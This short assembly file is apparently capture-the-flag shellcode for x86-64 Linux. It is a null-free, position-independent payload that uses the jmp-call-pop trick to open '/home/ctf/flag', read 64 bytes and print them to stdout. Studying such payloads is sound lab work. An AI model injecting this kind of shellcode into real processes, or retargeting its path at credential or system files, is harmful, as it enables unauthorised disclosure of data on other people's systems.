[global _start]
  
_start:
  jmp ed

st:
  ; open(const char *filename, int flags, int mode);
  pop rdi
  xor rax, rax
  mov al, 2
  xor rsi, rsi
  xor rdx, rdx
  syscall

  ; read(int fd, const char *buf, size_t count);
  mov rdi, rax ; fd is in rax
  xor rax, rax
  sub rsp, 64 ; buffer on stack
  mov rsi, rsp
  xor rdx, rdx
  add dl, 64
  syscall

  ; write(int fd, const char *buf, size_t count);
  mov rdx, rax
  xor rax, rax
  inc rax
  xor rdi, rdi
  inc rdi
  mov rsi, rsp
  syscall
  ret
  nop

ed:
  call st
  db "/home/ctf/flag", 0
